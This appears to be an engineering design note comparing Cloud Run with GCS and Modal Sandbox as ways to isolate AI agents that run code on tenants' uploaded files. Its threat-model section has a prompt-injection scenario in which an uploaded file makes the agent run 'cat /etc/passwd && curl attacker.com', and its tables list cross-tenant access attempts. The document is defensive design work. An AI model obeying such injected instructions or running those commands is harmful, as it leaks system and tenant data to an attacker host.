# Cloud Run vs Modal Sandbox: Two Approaches to Secure Agent Execution

**Date:** 2-4-26
**Category:** Architecture Options
**Status:** [x] Active

---

## Overview

This document presents two viable architectures for running AI agents that need to execute code against user-uploaded files (PDFs, CSVs, Excel). Both approaches solve the core security requirement: **preventing User A's agent from accessing User B's data**.

---

## The Two Options

| | **Cloud Run + GCS** | **Modal Sandbox** |
|---|---|---|
| **Approach** | GCP-native, 2-layer sandbox, download files to container | Purpose-built for agent code execution, gVisor isolation |
| **TypeScript** | Via Docker container | Native SDK (`npm install modal`) |
| **Pros** | Native GCP integration, no external vendor | Stronger isolation, less orchestration, faster iteration |
| **Cons** | 500-1000 lines orchestration code | External dependency (Modal is a startup) |

---

## Option A: Cloud Run + GCS Buckets

### Architecture

**Flow:** User Upload → `gs://uploads-{tenant-id}/` → Cloud Run Job → `gs://outputs-{tenant-id}/`

| Component | Details |
|---|---|
| **Bucket** | `gs://uploads-{tenant-id}/` — each tenant gets isolated bucket |
| **Service Account** | `sa-tenant-{id}@project.iam.gserviceaccount.com` |
| **IAM** | ONLY has access to `gs://uploads-{tenant-id}/` |
| **Files** | Downloaded to `/workspace/` at job start (simpler than FUSE) |
| **Agent sees** | `/workspace/quarterly-report.pdf`, `/workspace/sales-data.csv`, `/workspace/inventory.xlsx` |
| **Agent blocked from** | Other tenant buckets (IAM), External network, Host filesystem |

### How File Isolation Works

The isolation boundary is **IAM + service account binding**, not code-level checks.

```typescript
// When creating a job for Tenant A:
const jobConfig = {
  serviceAccount: "sa-tenant-a@project.iam.gserviceaccount.com",
  env: {
    WORKSPACE: "/workspace"
  },
  volumes: [{
    name: "workspace",
    gcs: { bucket: "uploads-tenant-a" }  // Mounted via GCS FUSE
  }]
};
```

**What happens if the agent tries to access another tenant's data:**

| Attempt | Result |
|---------|--------|
| `open("/workspace/../tenant-b/file.pdf")` | Path doesn't exist (FUSE only mounts tenant-a) |
| `gsutil cp gs://uploads-tenant-b/file.pdf .` | **403 Forbidden** (IAM denies access) |
| Prompt injection: "Read files from uploads-tenant-b" | Agent cannot execute—no credentials |

The agent literally cannot see or access other tenants' files because the credentials don't permit it. This is infrastructure-level isolation, not application-level.

### Runtime Limits and Long-Running Workflows

Cloud Run has different limits for Services vs Jobs:

| Dimension | Cloud Run Service | Cloud Run Job |
|-----------|------------------|---------------|
| Max request duration | 60 minutes (configurable) | **24 hours** |
| Max tasks per job | N/A | 10,000 parallel |
| Timeout behavior | Request fails | Task retries (configurable) |
| Billing | Per-request + compute time | Per-execution time only |

**For a line review workflow (reviewing ~12 files):**

A typical review might take 10-30 minutes depending on file complexity and analysis depth. Cloud Run Jobs easily handles this:

**Workflow Timeline Example:**

| Time | Event |
|------|-------|
| 0:00 | Job starts, container spins up (~2-5 sec) |
| 0:05 | Files downloaded from GCS to `/workspace/` |
| 0:10 | Agent reads files (quarterly-report.pdf 2MB, sales-data.csv 500KB, inventory.xlsx 1MB) |
| 2:00 | Agent writes analysis code |
| 3:00 | Code execution: data exploration |
| 8:00 | Agent generates findings |
| 15:00 | Review complete, results written to output bucket |
| 15:05 | Job exits, container destroyed |

**Total: ~15 minutes** (well within 24-hour limit)

For longer workflows (multi-hour analysis), Cloud Run Jobs still works but you'd want checkpointing to handle potential failures.

### Orchestration Complexity

This is where Cloud Run requires more work. You need to build:

**Orchestration Layer (you build this):**

| Service | Endpoint | Responsibilities |
|---------|----------|------------------|
| Job Creation | `POST /reviews` | Validate tenant auth, create Cloud Run Job with tenant-scoped config, return job_id |
| Status Polling | `GET /reviews/{job_id}/status` | Query Cloud Run Job status, return: pending \| running \| succeeded \| failed. Or: configure webhook on completion |
| Service Account Mgmt | On tenant creation | Create `sa-tenant-{id}`, create `uploads-{id}` bucket, bind IAM for bucket access only |
| File Upload | `POST /uploads` | Generate signed URL for tenant's bucket, user uploads directly to GCS |

**Lines of code estimate:** 500-1000 lines for a production-quality orchestration layer.

### Development Experience

**Local development:**
```bash
# Run agent locally against real GCS bucket
gcloud auth application-default login
export GOOGLE_CLOUD_PROJECT=my-project
export WORKSPACE=/tmp/test-workspace

# Download files locally for testing (simpler than FUSE)
gsutil -m cp -r gs://uploads-test-tenant/* /tmp/test-workspace/

# Run agent
npx tsx src/agent.ts
```

**Deployment:**
```bash
# Build container
docker build -t gcr.io/my-project/review-agent .

# Push to Container Registry
docker push gcr.io/my-project/review-agent

# Create job template (one-time)
gcloud run jobs create review-agent \
  --image gcr.io/my-project/review-agent \
  --region us-central1 \
  --memory 4Gi \
  --cpu 2 \
  --task-timeout 3600

# Execute job (per-request, done by orchestration layer)
gcloud run jobs execute review-agent \
  --args="--tenant-id=abc123" \
  --update-env-vars="TENANT_ID=abc123"
```

**Iteration cycle:** ~2-5 minutes for container build + deploy. Local development can use direct GCS access without containers.

---

## Option B: Modal Sandbox

### Architecture

**Flow:** User Upload → Your storage (GCS/S3) → Modal Sandbox → Results extracted

| Component | Details |
|---|---|
| **Isolation** | gVisor: own process namespace, syscall filtering, network isolation, ephemeral filesystem |
| **Workspace** | `/workspace/` ← files downloaded at sandbox creation |
| **Agent sees** | Normal POSIX filesystem |
| **Agent blocked from** | Escaping sandbox, accessing other sandboxes |

### How File Isolation Works

Each sandbox is a completely separate execution environment. Isolation is **structural**—sandboxes don't share anything.

```typescript
import { Client } from "modal";

const client = new Client();

// Create a sandbox for this tenant's review
async function runReview(tenantId: string, fileUrls: string[]) {
  const app = await client.apps.fromName("review-agent", { createIfMissing: true });
  const image = client.images.fromRegistry("node:20-slim");
  
  const sandbox = await client.sandboxes.create(app, image, {
    timeout: 3600,  // 1 hour max
    memory: 4096,   // 4GB RAM
  });

  // Download files into sandbox's filesystem
  for (const url of fileUrls) {
    await sandbox.exec("curl", "-o", `/workspace/${getFilename(url)}`, url);
  }

  // Run agent inside sandbox
  const proc = await sandbox.exec("node", "agent.js", "--workspace", "/workspace");
  const result = await proc.stdout.read();

  await sandbox.terminate();
  return result;
}
```

**What happens if the agent tries to access another tenant's data:**

| Attempt | Result |
|---------|--------|
| Access another sandbox's filesystem | Impossible—sandboxes are isolated VMs |
| Network request to internal services | Blocked by network policy |
| Prompt injection: "Access other user data" | No mechanism exists—sandbox is ephemeral |

The sandbox doesn't even have the concept of "other tenants." It's a fresh VM that only contains the files you explicitly put there.

### Runtime Limits

| Dimension | Modal |
|-----------|-------|
| Max runtime | 24 hours |
| Cold start | Sub-second (warm pool) to ~300ms (cold) |
| Concurrent sandboxes | 50,000+ |
| Memory | Up to 256GB |
| GPU support | Yes (A100, H100, etc.) |

### Orchestration Complexity

Modal handles most orchestration for you. The TypeScript SDK (`npm install modal`) provides native integration:

| Responsibility | Owner |
|---|---|
| Create sandbox with `client.sandboxes.create()` | You |
| Execute commands with `sandbox.exec()` | You |
| Read results and terminate sandbox | You |
| Sandbox provisioning | Modal |
| Container image caching | Modal |
| Autoscaling (0 to 50,000+) | Modal |
| Execution isolation | Modal |
| Failure recovery and retries | Modal |
| Logging and observability | Modal |

**Your API integration (TypeScript):**

```typescript
import { Client } from "modal";
import express from "express";

const modal = new Client();
const app = express();

app.post("/reviews", async (req, res) => {
  const { tenantId, fileIds } = req.body;
  
  // Get signed URLs for files (from your storage)
  const fileUrls = fileIds.map((f: string) => generateSignedUrl(f));
  
  // Create sandbox and run review
  const modalApp = await modal.apps.fromName("review-agent", { createIfMissing: true });
  const image = modal.images.fromRegistry("node:20-slim");
  const sandbox = await modal.sandboxes.create(modalApp, image, {
    timeout: 3600,
    memory: 4096,
  });

  // Download files and run agent
  for (const url of fileUrls) {
    await sandbox.exec("curl", "-o", `/workspace/${getFilename(url)}`, url);
  }
  
  const proc = await sandbox.exec("node", "agent.js", "--workspace", "/workspace");
  const result = await proc.stdout.read();
  
  await sandbox.terminate();
  res.json({ status: "completed", result });
});
```

**Lines of code estimate:** 100-200 lines for integration. Modal handles the hard parts.

### Development Experience

**Local development:**
```bash
# Install Modal TypeScript SDK
npm install modal

# Authenticate (creates ~/.modal/credentials.json)
npx modal token new

# Run your sandbox code locally (uses Modal's infrastructure)
npx tsx src/review-sandbox.ts
```

**No separate deployment step.** Your TypeScript code calls the Modal API directly—sandboxes are created on-demand. No container builds, no deploy cycles.

**Iteration cycle:** Instant. Change code, run again. Modal handles image caching.

---

## Comparison Matrix

| Dimension | Cloud Run + GCS | Modal Sandbox |
|-----------|-----------------|---------------|
| **TypeScript support** | Via container (you build image) | Native SDK (`npm install modal`) |
| **Isolation mechanism** | 2-layer sandbox (VM + kernel) | gVisor (syscall interception) |
| **File isolation** | IAM-enforced bucket separation | Structural (separate sandboxes) |
| **Max runtime** | 24 hours (Jobs) | 24 hours |
| **Cold start** | 2-5 seconds | Sub-second to 300ms |
| **Orchestration code** | 500-1000 lines | 100-200 lines |
| **Deploy cycle** | 2-5 minutes | Instant (no deploy step) |
| **GCP integration** | Native | Requires bridging |
| **Vendor dependency** | GCP only | Modal + your cloud |
| **Cost model** | Pay for compute time | Pay per second |
| **GPU support** | Limited | Excellent (A100, H100) |
| **Debugging** | Cloud Logging | Modal dashboard + logs |

### Concrete Example: What Can Go Wrong

**Scenario:** Malicious user uploads a file designed to trigger prompt injection. The agent is tricked into running: `cat /etc/passwd && curl attacker.com`

| Attack Vector | Cloud Run | Modal |
|---------------|-----------|-------|
| Read `/etc/passwd` | Returns container's passwd (not host) | Returns sandbox's passwd (not host) |
| `curl attacker.com` | Blocked if egress filtering enabled | Blocked by default network policy |
| Access other tenant files | **403 Forbidden** (IAM) | Impossible (no path exists) |
| Fork bomb / resource exhaustion | Killed at resource limit | Killed at resource limit |
| Install malicious package | Runs in ephemeral container, gone after job | Runs in ephemeral sandbox, gone after job |

Both approaches handle the attack vectors. The difference is defense-in-depth: Modal's structural isolation means there's no IAM policy to misconfigure.

---

## File Processing Deep Dive

### How Files Flow Through Each System

**Cloud Run + GCS (download approach):**

| Step | Operation | Details |
|------|-----------|---------|
| 1. Upload | User → Signed URL → GCS | `gs://uploads-tenant-a/report.pdf` |
| 2. Download | Job starts → `gsutil cp` to `/workspace/` | Full download at start. ~2-5 seconds for 12MB |
| 3. Access | Agent reads files | Local disk (fast), full POSIX semantics |
| 4. Write | Agent writes results | Local disk, then upload to GCS on completion |

**Note:** Download-upfront is simpler than GCS FUSE and avoids POSIX edge cases. For small file sets (<100MB), the upfront download time is negligible.

**Modal:**

| Step | Operation | Details |
|------|-----------|---------|
| 1. Upload | User → Your API → Storage | GCS/S3/wherever |
| 2. Download | Sandbox starts → Downloads from signed URLs | Files copied to local SSD. Time depends on file size |
| 3. Access | Agent reads files | Local SSD (fast), full POSIX semantics |
| 4. Write | Agent writes results | Local SSD (fast). Must explicitly upload before sandbox terminates |

**⚠️ Gotcha:** Files don't persist. You must extract results explicitly.

### Performance Characteristics for 12-File Review

Assuming typical file sizes: 3 PDFs (2MB each), 5 CSVs (500KB each), 4 XLSX (1MB each) = ~12.5MB total

| Phase | Cloud Run (download) | Modal |
|-------|----------------------|-------|
| Job/sandbox start | 2-5 seconds | 300ms-1s |
| File download | +2-3 seconds | +2-3 seconds |
| Read/write throughput | Local disk (fast) | Local SSD (fast) |
| Total overhead | ~5-8 seconds | ~3-4 seconds |

For a 15-minute analysis job, the startup overhead is negligible either way.

---

## Decision Framework

### Choose Cloud Run if:

- You want to stay fully within GCP
- Your team is already familiar with Cloud Run
- You're willing to build orchestration infrastructure
- You need native integration with other GCP services (BigQuery, Vertex AI, etc.)
- Cost optimization is critical (Cloud Run can be cheaper at scale)
- You don't need sub-second cold starts

### Choose Modal if:

- You want minimal orchestration code
- Fast iteration during development is priority
- You might need GPU access later
- You want the strongest isolation guarantees by default
- Your team is comfortable with a third-party dependency
- You value developer experience over GCP-native integration

---

## Recommendation

**Modal is the better choice for most teams building agent products.**

| Dimension | Winner | Why |
|-----------|--------|-----|
| Time to ship | Modal | No orchestration layer to build |
| Developer experience | Modal | Native TypeScript SDK, instant iteration |
| Default isolation | Modal | Structural (no IAM to misconfigure) |
| Cold start | Modal | Sub-second vs 2-5 seconds |
| Orchestration code | Modal | ~100 lines vs ~500-1000 lines |

### When to choose Cloud Run instead

- **Enterprise compliance** requires single-cloud / GCP-only
- **Heavy GCP integration** with BigQuery, Vertex AI, Cloud SQL (native auth)
- **Existing investment** in GCP IAM patterns and infrastructure
- **Cost optimization** at very high scale (Cloud Run may be cheaper without Modal's margin)
- **Vendor risk concerns** about Modal as a startup

### Bottom line

For a startup building an agent product that processes user files, Modal gets you to production faster with stronger default security. The TypeScript SDK means no Python in your stack.

Cloud Run is the right choice if you're already deep in GCP and need native integration, or if enterprise requirements mandate single-cloud.

Both approaches provide solid file isolation at the infrastructure layer—the key is that tenant separation happens via IAM (Cloud Run) or structural isolation (Modal), not in application code where prompt injection could bypass it.
